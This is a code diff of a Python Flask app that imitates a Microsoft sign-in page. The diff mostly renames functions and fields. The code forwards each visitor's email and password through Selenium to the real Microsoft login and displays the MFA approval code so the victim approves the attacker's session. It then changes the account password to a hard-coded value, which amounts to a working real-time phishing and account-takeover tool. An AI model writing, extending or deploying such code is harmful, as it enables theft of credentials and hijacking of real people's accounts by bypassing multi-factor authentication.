@@ -1,6 +1,6 @@
 from flask import render_template, redirect, url_for, session
 from app import app
-from app.forms import IdForm, PasswordForm
+from app.forms import NameForm, PasswordForm
 
 from selenium import webdriver
 from selenium.webdriver.firefox.service import Service
@@ -11,35 +11,33 @@ from selenium.webdriver.common.keys import Keys
 
 import os
 
-NEW_PASSWORD = "aaaaaaaa"
+def WEB_DRIVER_NAME(): return "geckodriver.exe"
+def NEW_PASSWORD(): return "aaaaaaaa"
+def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
+def WEB_DRIVER_SERVICE(): return Service(executable_path = WEB_DRIVER_PATH())
 
-WEB_DRIVER_NAME = "geckodriver.exe"
-CURRENT_WORKING_DIRECTORY = os.getcwd()
-WEB_DRIVER_PATH = CURRENT_WORKING_DIRECTORY + "\\app\\" + WEB_DRIVER_NAME
-
-WEB_DRIVER_SERVICE = Service(executable_path = WEB_DRIVER_PATH)
-DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE)
+DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE())
 
 DRIVER.get("https://myapps.microsoft.com")
 
 password_changed = False
 
-def Change_Password():
+def change_password():
     global password_changed
 
     DRIVER.get("https://mysignins.microsoft.com/security-info/password/change")
     NEW_PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
     CONFIRM_PASSWORD_FIELD = DRIVER.find_element(By.NAME, "newPasswordConfirm")
 
-    NEW_PASSWORD_FIELD.send_keys(NEW_PASSWORD)
-    CONFIRM_PASSWORD_FIELD.send_keys(NEW_PASSWORD)
+    NEW_PASSWORD_FIELD.send_keys(NEW_PASSWORD())
+    CONFIRM_PASSWORD_FIELD.send_keys(NEW_PASSWORD())
 
     SUBMIT_BUTTON = DRIVER.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
     SUBMIT_BUTTON.click()
 
     password_changed = True
 
-def Get_Authentication_Code():
+def get_authentication_code():
     try:
         AUTHENTICATION_CODE = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
         print("\nCode: " + AUTHENTICATION_CODE.text)
@@ -49,12 +47,12 @@ def Get_Authentication_Code():
         try:
             RESEND_REQUEST = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
             RESEND_REQUEST.click()
-            return Get_Authentication_Code()
+            return get_authentication_code()
 
         except:
             return False
 
-def Fill_Password(password):
+def fill_password(password):
     PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, "passwd")))
 
     PASSWORD_FIELD.send_keys(password)
@@ -68,10 +66,10 @@ def Fill_Password(password):
     except:
         return True
 
-def Fill_Email(email):
+def fill_name(name):
     EMAIL_FIELD = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, "loginfmt")))
 
-    EMAIL_FIELD.send_keys(email)
+    EMAIL_FIELD.send_keys(name)
     EMAIL_FIELD.send_keys(Keys.RETURN)
 
     try:
@@ -85,23 +83,23 @@ def Fill_Email(email):
 
 @app.route("/")
 def index():
-    if "identifier" not in session or "password" not in session or not password_changed:
+    if "name" not in session or "password" not in session or not password_changed:
         return redirect(url_for("login"))
 
-    return render_template("index.html", title="Fake Apps", header="Fake dashboard", identifier=session["identifier"])
+    return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
-    id_form = IdForm()
+    name_form = NameForm()
     password_form = PasswordForm()
 
-    if "identifier" in session and "password" in session:
-        authentication_code = Get_Authentication_Code()
+    if "name" in session and "password" in session:
+        authentication_code = get_authentication_code()
         if authentication_code:
             return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         elif not password_changed:
-            Change_Password()
+            change_password()
 
         try:
             WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.NAME, "Wait for some time before closing application")))
@@ -111,19 +109,19 @@ def login():
 
         return redirect(url_for("index"))
 
-    elif "identifier" not in session and id_form.validate_on_submit():
-        if Fill_Email(id_form.identifier.data):
-            session["identifier"] = id_form.identifier.data
-            return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", password_form=password_form)
+    elif "name" not in session and name_form.validate_on_submit():
+        if fill_name(name_form.name.data):
+            session["name"] = name_form.name.data
+            return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
 
-    elif "identifier" in session and password_form.validate_on_submit():
-        if Fill_Password(password_form.password.data):
+    elif "name" in session and password_form.validate_on_submit():
+        if fill_password(password_form.password.data):
             session["password"] = password_form.password.data
 
-            authentication_code = Get_Authentication_Code()
+            authentication_code = get_authentication_code()
             if authentication_code:
                 return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
-        return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", password_form=password_form)
+        return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
 
-    return render_template("login.html", title="Fake sign in", header="Fake sign in", id_form=id_form)
+    return render_template("login.html", title="Fake sign in", header="Fake sign in", form=name_form)
